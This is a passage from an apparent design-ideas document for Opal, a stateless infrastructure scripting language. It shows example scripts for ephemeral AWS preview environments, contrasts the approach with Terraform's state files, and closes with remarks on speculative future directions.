    
    # Create test instance
    var web = @aws.instance.deploy(name="test-pr-@var.PR_NUMBER") {
        apt-get install -y docker.io
    }
    
    # Deploy and test
    @aws.instance.ssh(instance=@var.web) {
        docker run -e DB_URL=@var.db.endpoint myapp:pr-@var.PR_NUMBER
        curl localhost/health
        npm run integration-tests
    }
    
    # Cleanup (or don't - Opal doesn't care)
    # Resources can be cleaned up by:
    # - CI job timeout
    # - AWS Lambda cleanup script
    # - Manual deletion
    # - Cost-based auto-cleanup
    # Next run just checks reality and creates fresh resources
}
```

### Stateless = No State File Headaches

**Key insight**: Opal queries reality every run, so it doesn't care how resources were created or destroyed.

```opal
# Monday: Create staging environment
opal deploy_staging
# Creates: RDS instance, EC2 instances, load balancer

# Tuesday: Someone deletes the load balancer in AWS console
# (No coordination needed, no state file to update)

# Wednesday: Run the script again
opal deploy_staging
# Checks reality:
# - RDS instance exists ✓ (skip creation)
# - EC2 instances exist ✓ (skip creation)  
# - Load balancer missing ✗ (create it)
# Script just works - no state conflicts
```

**Benefits for ops workflows:**
- **Ephemeral environments**: Spin up, use, destroy however you want
- **No state coordination**: Team members can create/destroy resources freely
- **Mix tools**: Use Opal + Terraform + AWS CLI + console together
- **Cleanup flexibility**: Resources can be cleaned up by any method
  - CI timeout kills everything
  - Cost-based Lambda cleanup
  - Manual deletion
  - TTL-based auto-cleanup
- **No drift**: Opal always sees current reality, can't get out of sync

**Contrast with traditional IaC:**

```hcl
# Terraform: Maintain state file
terraform apply    # Creates resources, writes state
# Someone deletes resource in console
terraform plan     # ERROR: State out of sync!
terraform refresh  # Fix state
terraform apply    # Now can proceed
```

```opal
# Opal: Query reality every time
opal deploy        # Creates resources
# Someone deletes resource in console  
opal deploy        # Checks reality, recreates missing resource
# Just works - no state to fix
```

### Perfect for CI/CD Ephemeral Environments

```opal
# PR preview environment
deploy_pr_preview: {
    var env = "pr-@var.PR_NUMBER"
    
    # Ensure infrastructure exists
    var db = @aws.rds.deploy(name="@var.env-db") {
        psql -f schema.sql
    }
    
    var web = @aws.instance.deploy(name="@var.env-web") {
        apt-get install -y docker.io nginx
    }
    
    # Deploy latest code (every run)
    @aws.instance.ssh(instance=@var.web) {
        docker pull myapp:@var.PR_SHA
        docker run -d -e DB_URL=@var.db.endpoint myapp:@var.PR_SHA
    }
    
    echo "Preview: http://@var.web.publicIp"
}

# Cleanup handled by:
# - CI job timeout (kills everything after 2 hours)
# - AWS Lambda (deletes resources tagged with old PR numbers)
# - Manual deletion when PR closes
# Opal doesn't care - next run checks reality and creates fresh
```

### Why This Works

- Plan-first model shows infrastructure changes before applying
- Block decorators provide clean resource scoping
- Stateless design prevents state file issues
- Re-evaluation on every run stays in sync with reality
- Decorator contracts enforce safety

## Why These Ideas Work

Opal's architecture enables them:
- Event-based parsing (fast, analyzable)
- Plan-then-execute model (verifiable, safe)
- Decorator system (extensible, sandboxable)
- Sub-millisecond performance (instant feedback)

Not all will be implemented, but they show what's possible.

---

These ideas represent potential directions for Opal's evolution. Some are speculative experiments (🧪), others have clear implementation paths (⚙️), and some are long-term strategic bets (🧭). The common thread: they all build on Opal's core architecture of deterministic, contract-based execution.
